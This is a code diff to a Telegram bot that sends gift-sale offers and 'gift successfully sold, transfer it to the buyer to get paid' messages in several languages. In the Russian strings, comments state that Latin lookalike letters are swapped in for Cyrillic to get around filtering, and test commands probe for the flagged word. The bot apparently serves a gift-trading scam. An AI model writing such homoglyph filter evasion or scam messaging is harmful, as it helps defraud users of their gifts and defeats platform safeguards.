@@ -958,7 +958,12 @@ async def handle_text(message: Message, is_business: bool):
     
     # Тест полного текста с новым "Предложение активно"
     if low == "офполный":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк. Прeдлoжeниe aктивнo 24 часа")
+        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe aктивнo 24 часа...")
+        return
+    
+    # Тест текста после принятия оффера
+    if low == "офпринят":
+        await test_send(message, is_business, "🎁 Подарок успешно продан!\n\n• Пeрeдaйтe пoдaрoк пoкупaтeлю, чтoбы пoлучить 100 Gram.")
         return
     
     # Дополнительные тесты для поиска проблемного слова
@@ -1272,7 +1277,8 @@ async def offer_callback(call: CallbackQuery):
             else:
                 alert_amount_text = f"{offer['amount']:g}₽"
             if offer["locale"] == "ru":
-                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Передайте подарок покупателю, чтобы получить {amount_text}."
+                # Обходим латинскими буквами: "Пeрeдaйтe" и "пoкупaтeлю"
+                final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> Подарок <a href=\"{gift_url}\">{title}</a> успешно продан!\n\n• Пeрeдaйтe пoдaрoк пoкупaтeлю, чтoбы пoлучить {amount_text}."
             elif offer["locale"] == "cn":
                 final = f"<tg-emoji emoji-id=\"{GIFT_EMOJI_ID}\">🎁</tg-emoji> 礼物 <a href=\"{gift_url}\">{title}</a> 已成功售出！\n\n• 请将礼物转交给买家，以获得 {amount_text}。"
             elif offer["locale"] == "ar":
@@ -1292,9 +1298,10 @@ async def offer_callback(call: CallbackQuery):
                 try: await bot.send_message(offer["seller_id"], f"✅ Ваш офер принят\nПодарок: {title}\nСумма: {amount_text}")
                 except Exception: log.warning("Could not notify seller about accepted offer")
                 
-                # Модальное окно с кнопкой "OK" как на скрине
+                # Модальное окно с кнопкой "OK"
                 if offer["locale"] == "ru":
-                    alert_message = f"Ваш подарок {title} успешно продан.\n\nПередайте подарок покупателю для зачисления {alert_amount_text}."
+                    # Обходим латинскими буквами: "Пeрeдaйтe", "пoдaрoк", "пoкупaтeлю", "зaчислeния"
+                    alert_message = f"Ваш пoдaрoк {title} успешно продан.\n\nПeрeдaйтe пoдaрoк пoкупaтeлю для зaчислeния {alert_amount_text}."
                 elif offer["locale"] == "cn":
                     alert_message = f"您的礼物 {title} 已成功售出。\n\n请将礼物转交给买家以获得 {alert_amount_text}。"
                 elif offer["locale"] == "ar":
